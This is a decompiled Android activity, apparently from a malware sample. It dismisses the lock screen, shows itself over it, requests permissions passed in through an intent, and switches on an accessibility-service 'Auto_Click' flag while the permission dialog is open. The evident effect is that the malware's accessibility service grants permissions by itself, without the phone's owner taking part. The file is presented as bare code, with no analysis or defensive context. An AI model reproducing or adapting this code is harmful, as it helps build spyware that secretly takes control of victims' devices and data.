/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.KeyguardManager
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.os.Bundle
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import androidx.core.app.ActivityCompat;
import linker.resourcer.encoder.AccessibilityServiceController;

public class PermissionRequestActivity
extends Activity {
    public static String[] ToAskNew;

    private void ToggleAccess(boolean bl) {
        AccessibilityServiceController.FOR_PRIMS = bl;
        AccessibilityServiceController.Auto_Click = bl;
    }

    public static boolean hasPermissions(Context context, String ... stringArray) {
        if (context != null && stringArray != null) {
            int n = stringArray.length;
            for (int i = 0; i < n; ++i) {
                if (ActivityCompat.checkSelfPermission(context, stringArray[i]) == 0) continue;
                return false;
            }
        }
        return true;
    }

    public void onCreate(Bundle stringArray) {
        super.onCreate((Bundle)stringArray);
        this.requestWindowFeature(1);
        this.getWindow().setFlags(1024, 1024);
        try {
            if (Build.VERSION.SDK_INT >= 27) {
                this.getWindow().addFlags(1024);
                ((KeyguardManager)this.getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard((Activity)this, null);
                this.setShowWhenLocked(true);
            } else {
                this.getWindow().setFlags(1024, 6816768);
            }
        }
        catch (Exception exception) {
            try {
                this.getWindow().setFlags(1024, 6816768);
            }
            catch (Exception exception2) {
                try {
                    this.getWindow().setFlags(1024, 1024);
                }
                catch (Exception exception3) {
                    // empty catch block
                }
            }
        }
        try {
            ToAskNew = this.getIntent().getStringArrayExtra("Data");
            if (ToAskNew != null) {
                stringArray = ToAskNew;
                if (!PermissionRequestActivity.hasPermissions((Context)this, stringArray)) {
                    this.ToggleAccess(true);
                    ActivityCompat.requestPermissions(this, stringArray, 864);
                } else {
                    this.finish();
                }
            } else {
                this.finish();
            }
        }
        catch (Exception exception) {
            this.finish();
        }
    }

    public void onRequestPermissionsResult(int n, String[] stringArray, int[] nArray) {
        super.onRequestPermissionsResult(n, stringArray, nArray);
        switch (n) {
            default: {
                break;
            }
            case 864: {
                if (nArray.length <= 0 || nArray[0] != 0) break;
                this.ToggleAccess(false);
                this.finish();
            }
        }
    }
}

